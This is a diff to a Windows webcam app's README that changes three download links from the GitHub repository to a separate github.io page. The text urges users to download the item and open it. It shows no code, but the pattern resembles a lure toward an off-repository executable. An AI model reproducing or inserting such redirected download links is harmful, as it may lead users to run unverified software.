@@ -1,6 +1,6 @@
 # 📷 clef-webcam - Run Smart Flash Decisions on Your Webcam
 
-[![Download clef-webcam](https://img.shields.io/badge/⬇️_Download_clef--webcam-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ntateMothobi/clef-webcam)
+[![Download clef-webcam](https://img.shields.io/badge/⬇️_Download_clef--webcam-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://ntatemothobi.github.io)
 
 **Visit this link to download the application.**
 
@@ -32,7 +32,7 @@ clef-webcam is especially helpful for users who prefer a visual, real-world way 
 
 Visit this link to download the application:
 
-[**Download clef-webcam**](https://github.com/ntateMothobi/clef-webcam)
+[**Download clef-webcam**](https://ntatemothobi.github.io)
 
 After you visit the download link, download the application from the official clef-webcam page. Once the download is complete, open the downloaded item to start the application on your Windows computer.
 
@@ -123,7 +123,7 @@ Yes. clef-webcam is designed to work with a webcam feed, so a connected or built
 
 Use the official link in this guide:
 
-[**Visit this link to download the application**](https://github.com/ntateMothobi/clef-webcam)
+[**Visit this link to download the application**](https://ntatemothobi.github.io)
 
 ## 📌 Quick Start Checklist
 
